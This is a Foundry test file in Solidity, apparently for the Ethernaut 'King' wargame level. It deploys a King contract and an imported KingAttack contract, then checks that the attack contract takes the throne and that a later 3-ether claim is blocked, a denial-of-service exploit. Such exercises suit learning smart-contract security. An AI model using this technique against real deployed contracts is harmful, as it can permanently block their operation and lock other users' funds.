// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/King.sol";
import "../src/KingAttack.sol";

contract KingTest is Test {
    function setUp() public {
    }

    function testKing() public {        
        address deployer = address(0x1234);
        payable(deployer).transfer(5 ether);
        address attacker = address(0x5678);
        payable(attacker).transfer(5 ether);
        
        vm.prank(deployer);
        King k = new King{value: 1 ether}();
        console.log("king: %s", k._king());
        KingAttack ka  = new KingAttack();
        ka.getKing{value: 2 ether}(address(k));
        console.log("king: %s", k._king());

        vm.prank(attacker);
        (bool success,) = address(k).call{value: 3 ether}("");
        require(!success);
    }

    receive() external payable {
    }
}